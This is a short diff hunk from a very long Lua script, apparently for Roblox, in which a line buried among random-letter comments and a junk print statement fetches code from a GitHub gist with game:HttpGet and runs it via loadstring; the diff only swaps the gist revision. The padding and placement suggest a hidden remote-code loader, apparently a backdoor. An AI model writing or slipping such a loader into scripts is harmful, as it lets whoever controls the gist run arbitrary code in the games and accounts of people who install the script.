@@ -4602,7 +4602,7 @@ local llawwalawldwladlwaldlwlawld = print("hisjdsdd))&)&*(&*(///////////31//////
 -- CNBCElBEhyK
 -- cUdsskMWAPttHmdGVS
 -- UJzRfoxabHJEOSUcLjptok
-loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d31b452967656eafc4937af2757857db/raw/3fd5df9bb635f7bd44fac713aaa2021256b9bfab/nothing"))()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/XXXXXXXXXXBGXXXXX/d31b452967656eafc4937af2757857db/raw/34bd5bb216d24e5546fd87b212a158f43a509927/nothing"))()
 -- ZzGiycNACAVGHZfOyW
 -- PkSjfVNFDcPZyOW
 -- thnerjmc
